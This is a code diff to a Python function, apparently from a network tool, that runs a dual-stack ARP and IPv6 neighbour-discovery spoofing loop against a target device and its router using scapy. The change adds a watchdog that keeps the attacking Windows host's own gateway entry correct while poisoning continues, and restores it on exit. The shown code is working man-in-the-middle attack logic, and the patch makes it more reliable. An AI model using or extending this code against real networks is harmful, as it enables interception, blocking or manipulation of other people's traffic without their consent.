@@ -35,10 +35,12 @@ def arp_spoof_loop(interface, target_ip, target_mac, router_ip, router_mac,
         return
 
     try:
-        from scapy.all import Ether, ARP, sendp
+        from scapy.all import conf, Ether, ARP, sendp
+        conf.sniff_promisc = False
         from scapy.layers.inet6 import IPv6, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr
-        from .network import get_scapy_interface, mac_to_ipv6_ll
+        from .network import get_scapy_interface, mac_to_ipv6_ll, get_interface_ip_and_mac, resolve_mac_from_arp_cache, win_send_arp
         npf_iface = get_scapy_interface(interface)
+        src_ip, _ = get_interface_ip_and_mac(interface)
         router_ipv6_ll = mac_to_ipv6_ll(router_mac)
         target_ipv6_ll = mac_to_ipv6_ll(target_mac)
 
@@ -82,6 +84,14 @@ def arp_spoof_loop(interface, target_ip, target_mac, router_ip, router_mac,
                 # Send IPv6 NDP NA poison (unicast frames to target & router)
                 sendp(pkt_na_to_target, iface=npf_iface, verbose=0)
                 sendp(pkt_na_to_router, iface=npf_iface, verbose=0)
+
+                # Realtime Self-Healing Watchdog for Host PC:
+                # If Windows host ARP cache ever accidentally maps the gateway to host's own MAC
+                # (via driver loopback on Ethernet), immediately restore the real router MAC!
+                current_gw_mac = resolve_mac_from_arp_cache(router_ip, interface_ip=src_ip)
+                if current_gw_mac and current_gw_mac in all_macs:
+                    win_send_arp(router_ip, src_ip=src_ip)
+
             except Exception as e:
                 log.debug(f"Spoof send error for {target_ip} (interface may be reconnecting): {e}")
                 npf_iface = get_scapy_interface(interface)
@@ -92,6 +102,8 @@ def arp_spoof_loop(interface, target_ip, target_mac, router_ip, router_mac,
     finally:
         # Restore ARP and NDP tables on exit
         _restore_arp(interface, target_ip, target_mac, router_ip, router_mac, my_mac)
+        if src_ip:
+            win_send_arp(router_ip, src_ip=src_ip)
         log.info(f"Dual-stack spoof stopped and restored: {target_ip}")
 
 
